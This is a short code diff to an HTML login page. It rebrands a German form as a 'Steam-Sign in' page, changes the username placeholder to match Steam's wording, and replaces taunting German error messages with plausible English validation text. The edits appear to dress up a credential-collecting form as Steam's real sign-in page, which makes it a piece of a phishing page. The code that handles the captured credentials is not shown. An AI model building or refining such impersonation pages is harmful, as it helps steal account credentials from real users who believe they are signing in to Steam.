@@ -66,10 +66,10 @@
 </head>
 <body>
     <div class="container">
-        <h2>Anmeldung</h2>
+        <h2>Steam-Sign in</h2>
         <div class="form-container">
             <form id="loginForm">
-                <input type="text" id="email" placeholder="E-Mail">
+                <input type="text" id="email" placeholder="E-mail or Account Name">
                 <br>
                 <input type="password" id="password" placeholder="Passwort">
                 <br>
@@ -87,12 +87,12 @@
             var password = document.getElementById("password").value;
 
             if (!validateEmail(email)) {
-                document.getElementById("errorMessage").innerText = "Sie denken wohl wir seinen Dumm!";
+                document.getElementById("errorMessage").innerText = "Please use a valid Email!";
                 return;
             }
 
             if (password === "") {
-                document.getElementById("errorMessage").innerText = "Immer noch! Wir sind NICHT DUMM!!!";
+                document.getElementById("errorMessage").innerText = "Please use a valid Password";
                 return;
             }
 
